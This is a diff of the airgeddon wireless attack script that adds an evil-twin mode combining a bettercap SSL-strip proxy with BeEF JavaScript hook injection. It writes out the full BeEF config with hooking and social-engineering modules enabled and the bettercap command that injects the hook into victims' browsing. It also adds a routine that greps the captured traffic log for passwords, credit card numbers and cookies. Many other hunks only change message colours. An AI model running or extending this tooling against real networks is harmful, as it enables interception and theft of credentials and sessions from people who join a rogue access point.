+		iptables -A INPUT -i lo -j ACCEPT
+		iptables -A INPUT -p tcp --destination-port ${beef_port} -j ACCEPT
 	fi
 
 	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
@@ -6864,7 +7263,7 @@ function launch_dhcp_server() {
 		"et_onlyap")
 			dchcpd_scr_window_position=${g1_bottomleft_window}
 		;;
-		"et_sniffing"|"et_captive_portal")
+		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2")
 			dchcpd_scr_window_position=${g3_middleleft_window}
 		;;
 		"et_sniffing_sslstrip")
@@ -6903,7 +7302,7 @@ function exec_et_deauth() {
 		"et_onlyap")
 			deauth_scr_window_position=${g1_bottomright_window}
 		;;
-		"et_sniffing"|"et_captive_portal")
+		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2")
 			deauth_scr_window_position=${g3_bottomleft_window}
 		;;
 		"et_sniffing_sslstrip")
@@ -7394,6 +7793,9 @@ function set_control_script() {
 		"et_sniffing"|"et_sniffing_sslstrip")
 			local control_msg=${et_misc_texts[${language},5]}
 		;;
+		"et_sniffing_sslstrip2")
+			local control_msg=${et_misc_texts[${language},27]}
+		;;
 		"et_captive_portal")
 			local control_msg=${et_misc_texts[${language},6]}
 		;;
@@ -7519,6 +7921,9 @@ function launch_control_window() {
 			fi
 		;;
 		"et_sniffing_sslstrip")
+			control_scr_window_position=${g4_topright_window}
+		;;
+		"et_sniffing_sslstrip2")
 			control_scr_window_position=${g4_topright_window}
 		;;
 	esac
@@ -7777,7 +8182,7 @@ function launch_sslstrip() {
 }
 
 #Launch ettercap sniffer
-function launch_sniffing() {
+function launch_ettercap_sniffing() {
 
 	recalculate_windows_sizes
 	case ${et_mode} in
@@ -7794,6 +8199,287 @@ function launch_sniffing() {
 	fi
 
 	xterm -hold -bg black -fg yellow -geometry "${sniffing_scr_window_position}" -T "Sniffer" -e "${ettercap_cmd}" > /dev/null 2>&1 &
+	et_processes+=($!)
+}
+
+#Create configuration file for beef
+function set_beef_config() {
+
+	tmpfiles_toclean=1
+	rm -rf "${tmpdir}${beef_file}" > /dev/null 2>&1
+
+	if [ -d "${beef_path}db" ]; then
+		beef_db="db/${beef_db}"
+	fi
+
+	{
+	echo -e "beef:"
+	echo -e "    version: 'airgeddon integrated'"
+	echo -e "    debug: false"
+	echo -e "    client_debug: false"
+	echo -e "    crypto_default_value_length: 80"
+	echo -e "    restrictions:"
+	echo -e "        permitted_hooking_subnet: \"${et_ip_range}/24\""
+	echo -e "        permitted_ui_subnet: \"0.0.0.0/0\""
+	#TODO: This should be permitted_ui_subnet: "127.0.0.1/32" but is not possible to use it with bettercap's proxy because of a bug
+	#https://github.com/evilsocket/bettercap/issues/356
+	#https://github.com/beefproject/beef/issues/1337
+	echo -e "    http:"
+	echo -e "        debug: false"
+	echo -e "        host: \"0.0.0.0\""
+	echo -e "        port: \"${beef_port}\""
+	echo -e "        dns_host: \"localhost\""
+	echo -e "        dns_port: 53"
+	echo -e "        web_ui_basepath: \"/ui\""
+	echo -e "        hook_file: \"/${jshookfile}\""
+	echo -e "        hook_session_name: \"BEEFHOOK\""
+	echo -e "        session_cookie_name: \"BEEFSESSION\""
+	echo -e "        web_server_imitation:"
+	echo -e "            enable: true"
+	echo -e "            type: \"apache\""
+	echo -e "            hook_404: false"
+	echo -e "            hook_root: false"
+	echo -e "    database:"
+	echo -e "        driver: \"sqlite\""
+	echo -e "        db_file: \"${beef_db}\""
+	echo -e "    credentials:"
+	echo -e "        user: \"beef\""
+	echo -e "        passwd: \"${beef_pass}\""
+	echo -e "    autorun:"
+	echo -e "        enable: true"
+	echo -e "        result_poll_interval: 300"
+	echo -e "        result_poll_timeout: 5000"
+	echo -e "        continue_after_timeout: true"
+	echo -e "    dns_hostname_lookup: false"
+	echo -e "    integration:"
+	echo -e "        phishing_frenzy:"
+	echo -e "            enable: false"
+	echo -e "    extension:"
+	echo -e "        requester:"
+	echo -e "            enable: true"
+	echo -e "        proxy:"
+	echo -e "            enable: true"
+	echo -e "            key: \"beef_key.pem\""
+	echo -e "            cert: \"beef_cert.pem\""
+	echo -e "        metasploit:"
+	echo -e "            enable: false"
+	echo -e "        social_engineering:"
+	echo -e "            enable: true"
+	echo -e "        evasion:"
+	echo -e "            enable: false"
+	echo -e "        console:"
+	echo -e "            shell:"
+	echo -e "                enable: false"
+	echo -e "        ipec:"
+	echo -e "            enable: true"
+	echo -e "        dns:"
+	echo -e "            enable: false"
+	echo -e "        dns_rebinding:"
+	echo -e "            enable: false"
+	} >> "${tmpdir}${beef_file}"
+}
+
+#Kill beef process
+function kill_beef() {
+
+	killall "${optional_tools_names[19]}" > /dev/null 2>&1
+	if [ "$?" != "0" ]; then
+		beef_pid=$(ps uax | pgrep -f "${optional_tools_names[19]}")
+		kill "${beef_pid}" &> /dev/null
+		if [ "$?" != "0" ]; then
+			beef_pid=$(ps uax | pgrep -f "beef")
+			kill "${beef_pid}" &> /dev/null
+		fi
+	fi
+}
+
+#Detects if your beef is Flexible Brainfuck interpreter instead of BeEF
+function detect_fake_beef() {
+
+	readarray -t BEEF_OUTPUT < <(timeout -s SIGTERM 0.5 beef -h 2> /dev/null)
+
+	for item in "${BEEF_OUTPUT[@]}"; do
+		if [[ ${item} =~ Brainfuck ]]; then
+			fake_beef_found=1
+			break
+		fi
+	done
+}
+
+#Search for beef path
+function search_for_beef() {
+
+	if [ "${beef_found}" -eq 0 ]; then
+		for item in "${possible_beef_known_locations[@]}"; do
+			if [ -f "${item}beef" ]; then
+				beef_path="${item}"
+				beef_found=1
+				break
+			fi
+		done
+	fi
+}
+
+#Prepare system to work with beef
+function prepare_beef_start() {
+
+	valid_possible_beef_path=0
+	if [[ ${beef_found} -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[19]}]} -eq 0 ]]; then
+		language_strings "${language}" 405 "blue"
+		ask_yesno 191
+		if [ ${yesno} = "y" ]; then
+			manual_beef_set
+			search_for_beef
+		fi
+
+		if [[ ${beef_found} -eq 1 ]] && [[ ${valid_possible_beef_path} -eq 1 ]]; then
+			fix_beef_executable "${manually_entered_beef_path}"
+		fi
+
+		if [ ${beef_found} -eq 1 ]; then
+			echo
+			language_strings "${language}" 413 "yellow"
+			language_strings "${language}" 115 "read"
+		fi
+	elif [[ "${beef_found}" -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[19]}]} -eq 0 ]]; then
+		fix_beef_executable "${beef_path}"
+		echo
+		language_strings "${language}" 413 "yellow"
+		language_strings "${language}" 115 "read"
+	elif [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[19]}]} -eq 1 ]]; then
+		language_strings "${language}" 405 "blue"
+		ask_yesno 415
+		if [ ${yesno} = "y" ]; then
+			manual_beef_set
+			search_for_beef
+			if [[ ${beef_found} -eq 1 ]] && [[ ${valid_possible_beef_path} -eq 1 ]]; then
+				rewrite_script_with_custom_beef "set" "${manually_entered_beef_path}"
+				echo
+				language_strings "${language}" 413 "yellow"
+				language_strings "${language}" 115 "read"
+			fi
+		fi
+	fi
+}
+
+#Set beef path manually
+function manual_beef_set() {
+
+	while [[ "${valid_possible_beef_path}" != "1" ]]; do
+		echo
+		language_strings "${language}" 402 "green"
+		read -r manually_entered_beef_path
+		if [ -n "${manually_entered_beef_path}" ]; then
+			lastcharmanually_entered_beef_path=${manually_entered_beef_path: -1}
+			if [ "${lastcharmanually_entered_beef_path}" != "/" ]; then
+				manually_entered_beef_path="${manually_entered_beef_path}/"
+			fi
+
+			firstcharmanually_entered_beef_path=${manually_entered_beef_path:0:1}
+			if [ "${firstcharmanually_entered_beef_path}" != "/" ]; then
+				language_strings "${language}" 404 "red"
+			else
+				if [ -d "${manually_entered_beef_path}" ]; then
+					if [ -f "${manually_entered_beef_path}beef" ]; then
+						head "${manually_entered_beef_path}beef" -n 1 2> /dev/null| grep ruby > /dev/null
+						if [ "$?" = "0" ]; then
+							possible_beef_known_locations+=(${manually_entered_beef_path})
+							valid_possible_beef_path=1
+						else
+							language_strings "${language}" 406 "red"
+						fi
+					else
+						language_strings "${language}" 406 "red"
+					fi
+				else
+					language_strings "${language}" 403 "red"
+				fi
+			fi
+		fi
+	done
+}
+
+#Fix for not found beef executable
+function fix_beef_executable() {
+
+	rm -rf "/usr/bin/beef" > /dev/null 2>&1
+	{
+	echo -e "#!/bin/bash\n"
+	echo -e "cd ${1}"
+	echo -e "./beef"
+	} >> "/usr/bin/beef"
+	chmod +x "/usr/bin/beef" > /dev/null 2>&1
+	optional_tools[${optional_tools_names[19]}]=1
+
+	rewrite_script_with_custom_beef "set" "${1}"
+}
+
+#Rewrite airgeddon script in a polymorphic way adding custom beef location to array to get persistence
+function rewrite_script_with_custom_beef() {
+
+	set_script_folder_and_name
+
+	case ${1} in
+		"set")
+			sed -ri "s:(\s+|\t+)([\"0-9a-zA-Z/\-_ ]+)?\s?(#Custom BeEF location \(set=)([01])(\)):\1\"${2}\" \31\5:" "${scriptfolder}${scriptname}" 2> /dev/null
+			chmod +x "${scriptfolder}${scriptname}" > /dev/null 2>&1
+		;;
+		"search")
+			beef_custom_path_line=$(cat < "${scriptfolder}${scriptname}" 2> /dev/null | grep "#[C]ustom BeEF location (set=1)" 2> /dev/null)
+			if [ -n "${beef_custom_path_line}" ]; then
+				[[ ${beef_custom_path_line} =~ \"(.*)\" ]] && beef_custom_path="${BASH_REMATCH[1]}"
+			fi
+		;;
+	esac
+}
+
+#Start beef process as a service
+function start_beef_service() {
+
+	service "${optional_tools_names[19]}" restart > /dev/null 2>&1
+	if [ "$?" != "0" ]; then
+		systemctl restart "${optional_tools_names[19]}.service" > /dev/null 2>&1
+	fi
+}
+
+#Launch beef browser exploitation framework
+function launch_beef() {
+
+	kill_beef
+
+	if [ "${beef_found}" -eq 0 ]; then
+		start_beef_service
+	fi
+
+	recalculate_windows_sizes
+	if [ "${beef_found}" -eq 1 ]; then
+		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
+		cp "${tmpdir}${beef_file}" "${beef_path}" > /dev/null 2>&1
+		xterm -hold -bg black -fg green -geometry "${g4_middleright_window}" -T "BeEF" -e "cd ${beef_path} && ./beef -c \"${beef_file}\"" > /dev/null 2>&1 &
+	else
+		xterm -hold -bg black -fg green -geometry "${g4_middleright_window}" -T "BeEF" -e "${optional_tools_names[19]}" > /dev/null 2>&1 &
+	fi
+	et_processes+=($!)
+	sleep 2
+}
+
+#Launch bettercap sniffer
+function launch_bettercap_sniffing() {
+
+	recalculate_windows_sizes
+	sniffing_scr_window_position=${g4_bottomright_window}
+
+	if compare_floats_greater_or_equal "${bettercap_version}" "${minimum_bettercap_advanced_options}"; then
+		bettercap_extra_cmd_options="--disable-parsers URL,HTTPS,DHCP --no-http-logs"
+	fi
+
+	bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
+
+	if [ ${bettercap_log} -eq 1 ]; then
+		bettercap_cmd+=" -O \"${tmp_bettercaplog}\""
+	fi
+
+	xterm -hold -bg black -fg yellow -geometry "${sniffing_scr_window_position}" -T "Sniffer+Bettercap-Sslstrip2/BeEF" -e "${bettercap_cmd}" > /dev/null 2>&1 &
 	et_processes+=($!)
 }
 
@@ -7829,6 +8515,62 @@ function parse_ettercap_log() {
 	else
 		language_strings "${language}" 306 "blue"
 		cp "${tmpdir}parsed_file" "${ettercap_logpath}" > /dev/null 2>&1
+	fi
+
+	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
+	language_strings "${language}" 115 "read"
+}
+
+#Parse bettercap log searching for captured passwords
+function parse_bettercap_log() {
+
+	echo
+	language_strings "${language}" 304 "blue"
+
+	local regexp='USER|PASS|CREDITCARD|COOKIE|PWD|USUARIO|CONTRASE'
+	local regexp2='USER-AGENT|COOKIES|BEEFHOOK'
+	readarray -t BETTERCAPLOG < <(cat < "${tmp_bettercaplog}" 2> /dev/null | egrep -i ${regexp} | egrep -vi ${regexp2})
+
+	{
+	echo ""
+	date +%Y-%m-%d
+	echo "${et_misc_texts[${language},8]}"
+	echo ""
+	echo "BSSID: ${bssid}"
+	echo "${et_misc_texts[${language},1]}: ${channel}"
+	echo "ESSID: ${essid}"
+	echo ""
+	echo "---------------"
+	echo ""
+	} >> "${tmpdir}parsed_file"
+
+	pass_counter=0
+	captured_cookies=()
+	for cpass in "${BETTERCAPLOG[@]}"; do
+		if [[ ${cpass} =~ COOKIE ]]; then
+			repeated_cookie=0
+			for item in "${captured_cookies[@]}"; do
+				if [ "${item}" = "${cpass}" ]; then
+					repeated_cookie=1
+					break
+				fi
+			done
+			if [ ${repeated_cookie} -eq 0 ]; then
+				captured_cookies+=("${cpass}")
+				echo "${cpass}" >> "${tmpdir}parsed_file"
+				pass_counter=$((pass_counter + 1))
+			fi
+		else
+			echo "${cpass}" >> "${tmpdir}parsed_file"
+			pass_counter=$((pass_counter + 1))
+		fi
+	done
+
+	if [ ${pass_counter} -eq 0 ]; then
+		language_strings "${language}" 305 "yellow"
+	else
+		language_strings "${language}" 399 "blue"
+		cp "${tmpdir}parsed_file" "${bettercap_logpath}" > /dev/null 2>&1
 	fi
 
 	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
@@ -8065,7 +8807,7 @@ function capture_handshake_evil_twin() {
 
 	if [[ ${enc} != "WPA" ]] && [[ ${enc} != "WPA2" ]]; then
 		echo
-		language_strings "${language}" 137 "yellow"
+		language_strings "${language}" 137 "red"
 		language_strings "${language}" 115 "read"
 		return 1
 	fi
@@ -8122,7 +8864,7 @@ function capture_handshake_evil_twin() {
 		return 0
 	else
 		echo
-		language_strings "${language}" 146 "yellow"
+		language_strings "${language}" 146 "red"
 		language_strings "${language}" 115 "read"
 		return 2
 	fi
@@ -8144,7 +8886,7 @@ function capture_handshake() {
 
 	if [[ ${enc} != "WPA" ]] && [[ ${enc} != "WPA2" ]]; then
 		echo
-		language_strings "${language}" 137 "yellow"
+		language_strings "${language}" 137 "red"
 		language_strings "${language}" 115 "read"
 		return 1
 	fi
@@ -8159,7 +8901,7 @@ function capture_handshake() {
 function check_file_exists() {
 
 	if [[ ! -f "${1}" || -z "${1}" ]]; then
-		language_strings "${language}" 161 "yellow"
+		language_strings "${language}" 161 "red"
 		return 1
 	fi
 	return 0
@@ -8171,13 +8913,13 @@ function validate_path() {
 	dirname=${1%/*}
 
 	if [[ ! -d "${dirname}" ]] || [[ "${dirname}" = "." ]]; then
-		language_strings "${language}" 156 "yellow"
+		language_strings "${language}" 156 "red"
 		return 1
 	fi
 
 	check_write_permissions "${dirname}"
 	if [ "$?" != "0" ]; then
-		language_strings "${language}" 157 "yellow"
+		language_strings "${language}" 157 "red"
 		return 1
 	fi
 
@@ -8202,6 +8944,10 @@ function validate_path() {
 			"ettercaplog")
 				suggested_filename="${default_ettercaplogfilename}"
 				ettercap_logpath="${ettercap_logpath}${default_ettercaplogfilename}"
+			;;
+			"bettercaplog")
+				suggested_filename="${default_bettercaplogfilename}"
+				bettercap_logpath="${bettercap_logpath}${default_bettercaplogfilename}"
 			;;
 			"writeethandshake")
 				et_handshake="${pathname}${standardhandshake_filename}"
@@ -8290,6 +9036,14 @@ function read_path() {
 			fi
 			validate_path "${ettercap_logpath}" "${1}"
 		;;
+		"bettercaplog")
+			language_strings "${language}" 398 "green"
+			read_and_clean_path "bettercap_logpath"
+			if [ -z "${bettercap_logpath}" ]; then
+				bettercap_logpath="${default_bettercap_logpath}"
+			fi
+			validate_path "${bettercap_logpath}" "${1}"
+		;;
 		"ethandshake")
 			language_strings "${language}" 154 "green"
 			read_and_clean_path "et_handshake"
@@ -8347,7 +9101,7 @@ function attack_handshake_menu() {
 			return
 		else
 			echo
-			language_strings "${language}" 146 "yellow"
+			language_strings "${language}" 146 "red"
 			language_strings "${language}" 115 "read"
 		fi
 	fi
@@ -8470,7 +9224,7 @@ function explore_for_targets_option() {
 	csvline=$(wc -l "${tmpdir}nws.csv" 2> /dev/null | awk '{print $1}')
 	if [ "${csvline}" -le 3 ]; then
 		echo
-		language_strings "${language}" 68 "yellow"
+		language_strings "${language}" 68 "red"
 		language_strings "${language}" 115 "read"
 		return 1
 	fi
@@ -8558,7 +9312,7 @@ function explore_for_wps_targets_option() {
 	washlines=$(wc -l "${tmpdir}wps.txt" 2> /dev/null | awk '{print $1}')
 	if [ "${washlines}" -le ${wash_start_data_line} ]; then
 		echo
-		language_strings "${language}" 68 "yellow"
+		language_strings "${language}" 68 "red"
 		language_strings "${language}" 115 "read"
 		return 1
 	fi
@@ -8667,7 +9421,7 @@ function explore_for_wps_targets_option() {
 		fi
 
 		echo
-		language_strings "${language}" 72 "yellow"
+		language_strings "${language}" 72 "red"
 		echo
 		language_strings "${language}" 3 "green"
 		read -r selected_wps_target_network
@@ -8755,7 +9509,7 @@ function select_target() {
 
 	while [[ ${selected_target_network} -lt 1 ]] || [[ ${selected_target_network} -gt ${i} ]]; do
 		echo
-		language_strings "${language}" 72 "yellow"
+		language_strings "${language}" 72 "red"
 		echo
 		language_strings "${language}" 3 "green"
 		read -r selected_target_network
@@ -8829,6 +9583,9 @@ function et_prerequisites() {
 		"et_sniffing_sslstrip")
 			language_strings "${language}" 292 "title"
 		;;
+		"et_sniffing_sslstrip2")
+			language_strings "${language}" 397 "title"
+		;;
 		"et_captive_portal")
 			language_strings "${language}" 293 "title"
 		;;
@@ -8848,6 +9605,7 @@ function et_prerequisites() {
 		ask_yesno 277
 		if [ ${yesno} = "n" ]; then
 			return_to_et_main_menu=1
+			return_to_et_main_menu_from_beef=1
 			return
 		fi
 	fi
@@ -8903,9 +9661,9 @@ function et_prerequisites() {
 
 	if [[ "${et_mode}" = "et_sniffing" ]] || [[ "${et_mode}" = "et_sniffing_sslstrip" ]]; then
 		manage_ettercap_log
-	fi
-
-	if [ "${et_mode}" = "et_captive_portal" ]; then
+	elif [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
+		manage_bettercap_log
+	elif [ "${et_mode}" = "et_captive_portal" ]; then
 		manage_captive_portal_log
 		language_strings "${language}" 115 "read"
 		set_captive_portal_language
@@ -8913,6 +9671,7 @@ function et_prerequisites() {
 	fi
 
 	return_to_et_main_menu=1
+	return_to_et_main_menu_from_beef=1
 	echo
 	language_strings "${language}" 296 "yellow"
 	language_strings "${language}" 115 "read"
@@ -8927,6 +9686,9 @@ function et_prerequisites() {
 		;;
 		"et_sniffing_sslstrip")
 			exec_et_sniffing_sslstrip_attack
+		;;
+		"et_sniffing_sslstrip2")
+			exec_et_sniffing_sslstrip2_attack
 		;;
 		"et_captive_portal")
 			exec_et_captive_portal_attack
@@ -9017,7 +9779,7 @@ function et_dos_menu() {
 								et_prerequisites
 							else
 								echo
-								language_strings "${language}" 327 "yellow"
+								language_strings "${language}" 327 "red"
 								language_strings "${language}" 115 "read"
 								return_to_et_main_menu=1
 								return
@@ -9064,7 +9826,7 @@ function et_dos_menu() {
 								et_prerequisites
 							else
 								echo
-								language_strings "${language}" 327 "yellow"
+								language_strings "${language}" 327 "red"
 								language_strings "${language}" 115 "read"
 								return_to_et_main_menu=1
 								return
@@ -9111,7 +9873,7 @@ function et_dos_menu() {
 								et_prerequisites
 							else
 								echo
-								language_strings "${language}" 327 "yellow"
+								language_strings "${language}" 327 "red"
 								language_strings "${language}" 115 "read"
 								return_to_et_main_menu=1
 								return
@@ -9138,6 +9900,7 @@ function et_dos_menu() {
 			fi
 		;;
 		4)
+			return_to_et_main_menu_from_beef=1
 			return
 		;;
 		*)
@@ -9205,7 +9968,7 @@ function credits_option() {
 function invalid_language_selected() {
 
 	echo
-	language_strings "${language}" 82 "yellow"
+	language_strings "${language}" 82 "red"
 	echo
 	language_strings "${language}" 115 "read"
 	echo
@@ -9215,7 +9978,7 @@ function invalid_language_selected() {
 #Show message for captive portal invalid selected language
 function invalid_captive_portal_language_selected() {
 
-	language_strings "${language}" 82 "yellow"
+	language_strings "${language}" 82 "red"
 	echo
 	language_strings "${language}" 115 "read"
 	set_captive_portal_language
@@ -9225,7 +9988,7 @@ function invalid_captive_portal_language_selected() {
 function forbidden_menu_option() {
 
 	echo
-	language_strings "${language}" 220 "yellow"
+	language_strings "${language}" 220 "red"
 	language_strings "${language}" 115 "read"
 }
 
@@ -9233,7 +9996,7 @@ function forbidden_menu_option() {
 function invalid_menu_option() {
 
 	echo
-	language_strings "${language}" 76 "yellow"
+	language_strings "${language}" 76 "red"
 	language_strings "${language}" 115 "read"
 }
 
@@ -9241,7 +10004,7 @@ function invalid_menu_option() {
 function invalid_iface_selected() {
 
 	echo
-	language_strings "${language}" 77 "yellow"
+	language_strings "${language}" 77 "red"
 	echo
 	language_strings "${language}" 115 "read"
 	echo
@@ -9252,7 +10015,7 @@ function invalid_iface_selected() {
 function invalid_internet_iface_selected() {
 
 	echo
-	language_strings "${language}" 77 "yellow"
+	language_strings "${language}" 77 "red"
 	echo
 	language_strings "${language}" 115 "read"
 	echo
@@ -9336,6 +10099,7 @@ function exit_script_option() {
 		killall dhcpd > /dev/null 2>&1
 		killall hostapd > /dev/null 2>&1
 		killall lighttpd > /dev/null 2>&1
+		kill_beef
 		time_loop
 		echo -e "${green_color} Ok\r${normal_color}"
 	fi
@@ -9369,6 +10133,7 @@ function hardcore_exit() {
 		killall dhcpd > /dev/null 2>&1
 		killall hostapd > /dev/null 2>&1
 		killall lighttpd > /dev/null 2>&1
+		kill_beef
 	fi
 
 	exit ${exit_code}
@@ -9422,6 +10187,12 @@ function get_hashcat_version() {
 	hashcat_version=${hashcat_version#"v"}
 }
 
+#Determine bettercap version
+function get_bettercap_version() {
+
+	bettercap_version=$(bettercap -v 2> /dev/null | egrep "^bettercap [0-9]" | awk '{print $2}')
+}
+
 #Determine bully version
 function get_bully_version() {
 
@@ -9467,18 +10238,20 @@ function validate_reaver_pixiewps_version() {
 	return 1
 }
 
-#Set the script folder var
+#Set the script folder var if necessary
 function set_script_folder_and_name() {
 
-	scriptfolder=${0}
+	if [ -z "${scriptfolder}" ]; then
+		scriptfolder=${0}
 
-	if ! [[ ${0} =~ ^/.*$ ]]; then
-		if ! [[ ${0} =~ ^.*/.*$ ]]; then
-			scriptfolder="./"
+		if ! [[ ${0} =~ ^/.*$ ]]; then
+			if ! [[ ${0} =~ ^.*/.*$ ]]; then
+				scriptfolder="./"
+			fi
 		fi
+		scriptfolder="${scriptfolder%/*}/"
+		scriptname="${0##*/}"
 	fi
-	scriptfolder="${scriptfolder%/*}/"
-	scriptname="${0##*/}"
 }
 
 #Check if pins database file exist and try to download the new one if proceed
@@ -9521,23 +10294,28 @@ function check_pins_database_file() {
 	else
 		language_strings "${language}" 374 "yellow"
 		echo
-		language_strings "${language}" 287 "blue"
-		check_internet_access "${host_to_check_internet}"
-		if [ "$?" != "0" ]; then
-			echo
-			language_strings "${language}" 375 "yellow"
-			return 1
-		else
-			echo
-			download_pins_database_file
-			if [ "$?" = "0" ]; then
-				language_strings "${language}" 377 "yellow"
-				pin_dbfile_checked=1
-				return 0
-			else
-				language_strings "${language}" 378 "yellow"
+		if hash curl 2> /dev/null; then
+			language_strings "${language}" 287 "blue"
+			check_internet_access "${host_to_check_internet}"
+			if [ "$?" != "0" ]; then
+				echo
+				language_strings "${language}" 375 "yellow"
 				return 1
+			else
+				echo
+				download_pins_database_file
+				if [ "$?" = "0" ]; then
+					language_strings "${language}" 377 "yellow"
+					pin_dbfile_checked=1
+					return 0
+				else
+					language_strings "${language}" 378 "yellow"
+					return 1
+				fi
 			fi
+		else
+			language_strings "${language}" 414 "yellow"
+			return 1
 		fi
 	fi
 }
@@ -9896,7 +10674,7 @@ function check_compatibility() {
 		if ! hash "${i}" 2> /dev/null; then
 			echo -ne "${red_color} Error${normal_color}"
 			essential_toolsok=0
-			echo -ne " (${possible_package_names[${language}]} : ${possible_package_names[${i}]})"
+			echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
 			echo -e "\r"
 		else
 			echo -e "${green_color} Ok\r${normal_color}"
@@ -9913,11 +10691,24 @@ function check_compatibility() {
 		if ! hash "${i}" 2> /dev/null; then
 			echo -ne "${red_color} Error${normal_color}"
 			optional_toolsok=0
-			echo -ne " (${possible_package_names[${language}]} : ${possible_package_names[${i}]})"
+			echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
 			echo -e "\r"
 		else
-			echo -e "${green_color} Ok\r${normal_color}"
-			optional_tools[${i}]=1
+			if [ "${i}" = "beef" ]; then
+				detect_fake_beef
+				if [ ${fake_beef_found} -eq 1 ]; then
+					echo -ne "${red_color} Error${normal_color}"
+					optional_toolsok=0
+					echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
+					echo -e "\r"
+				else
+					echo -e "${green_color} Ok\r${normal_color}"
+					optional_tools[${i}]=1
+				fi
+			else
+				echo -e "${green_color} Ok\r${normal_color}"
+				optional_tools[${i}]=1
+			fi
 		fi
 	done
 
@@ -9933,7 +10724,7 @@ function check_compatibility() {
 			if ! hash "${i}" 2> /dev/null; then
 				echo -ne "${red_color} Error${normal_color}"
 				update_toolsok=0
-				echo -ne " (${possible_package_names[${language}]} : ${possible_package_names[${i}]})"
+				echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
 				echo -e "\r"
 			else
 				echo -e "${green_color} Ok\r${normal_color}"
@@ -9943,7 +10734,7 @@ function check_compatibility() {
 
 	if [ ${essential_toolsok} -eq 0 ]; then
 		echo
-		language_strings "${language}" 111 "yellow"
+		language_strings "${language}" 111 "red"
 		echo
 		return
 	fi
@@ -9954,6 +10745,10 @@ function check_compatibility() {
 		echo
 		language_strings "${language}" 219 "yellow"
 		echo
+		if [ ${fake_beef_found} -eq 1 ]; then
+			language_strings "${language}" 401 "red"
+			echo
+		fi
 		return
 	fi
 
@@ -9969,7 +10764,7 @@ function check_bash_version() {
 	if compare_floats_greater_or_equal "${bashversion}" ${minimum_bash_version_required}; then
 		language_strings "${language}" 221 "yellow"
 	else
-		language_strings "${language}" 222 "yellow"
+		language_strings "${language}" 222 "red"
 		exit_code=1
 		exit_script_option
 	fi
@@ -10099,6 +10894,8 @@ function initialize_script_settings() {
 	networkmanager_cmd="service network-manager restart"
 	is_arm=0
 	pin_dbfile_checked=0
+	beef_found=0
+	fake_beef_found=0
 }
 
 #Detect screen resolution if possible
@@ -10211,6 +11008,8 @@ function welcome() {
 	fi
 
 	detect_screen_resolution
+	set_possible_aliases
+	initialize_optional_tools_values
 
 	if [ ${debug_mode} -eq 0 ]; then
 		language_strings "${language}" 86 "title"
@@ -10242,7 +11041,7 @@ function welcome() {
 		if [ ${resolution_detected} -eq 1 ]; then
 			language_strings "${language}" 294 "blue"
 		else
-			language_strings "${language}" 295 "blue"
+			language_strings "${language}" 295 "red"
 			echo
 			language_strings "${language}" 300 "yellow"
 		fi
@@ -10272,14 +11071,14 @@ function airmonzc_security_check() {
 	if [ "${airmon}" = "airmon-zc" ]; then
 		if ! hash ethtool 2> /dev/null; then
 			echo
-			language_strings "${language}" 247 "yellow"
+			language_strings "${language}" 247 "red"
 			echo
 			language_strings "${language}" 115 "read"
 			exit_code=1
 			exit_script_option
 		elif ! hash lspci 2> /dev/null; then
 			echo
-			language_strings "${language}" 301 "yellow"
+			language_strings "${language}" 301 "red"
 			echo
 			language_strings "${language}" 115 "read"
 			exit_code=1
@@ -10303,14 +11102,16 @@ function compare_floats_greater_or_equal() {
 #Update and relaunch the script
 function download_last_version() {
 
+	rewrite_script_with_custom_beef "search"
 	timeout -s SIGTERM 15 curl -L ${urlscript_directlink} -s -o "${0}"
 
 	if [ "$?" = "0" ]; then
 		echo
 		language_strings "${language}" 214 "yellow"
 
-		set_script_folder_and_name
-		chmod +x "${scriptfolder}${scriptname}" > /dev/null 2>&1
+		if [ -n "${beef_custom_path}" ]; then
+			rewrite_script_with_custom_beef "set" "${beef_custom_path}"
+		fi
 		language_strings "${language}" 115 "read"
 		exec "${scriptfolder}${scriptname}"
 	else
@@ -10327,7 +11128,7 @@ function validate_et_internet_interface() {
 
 	if [ "$?" != "0" ]; then
 		echo
-		language_strings "${language}" 288 "yellow"
+		language_strings "${language}" 288 "red"
 		language_strings "${language}" 115 "read"
 		return 1
 	fi
@@ -10335,7 +11136,7 @@ function validate_et_internet_interface() {
 	check_default_route "${internet_interface}"
 	if [ "$?" != "0" ]; then
 		echo
-		language_strings "${language}" 290 "yellow"
+		language_strings "${language}" 290 "red"
 		language_strings "${language}" 115 "read"
 		return 1
 	fi
@@ -10429,6 +11230,7 @@ function remove_warnings() {
 	echo "${et_onlyap_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_sniffing_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_sniffing_sslstrip_dependencies[@]}" > /dev/null 2>&1
+	echo "${et_sniffing_sslstrip2_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_captive_portal_dependencies[@]}" > /dev/null 2>&1
 	echo "${wash_scan_dependencies[@]}" > /dev/null 2>&1
 	echo "${bully_attacks_dependencies[@]}" > /dev/null 2>&1
@@ -10518,6 +11320,12 @@ function echo_red() {
 function echo_red_slim() {
 
 	last_echo "${1}" "${red_color_slim}"
+}
+
+#Print black messages with background for titles
+function echo_green_title() {
+
+	last_echo "${1}" "${green_color_title}"
 }
 
 #Print pink messages
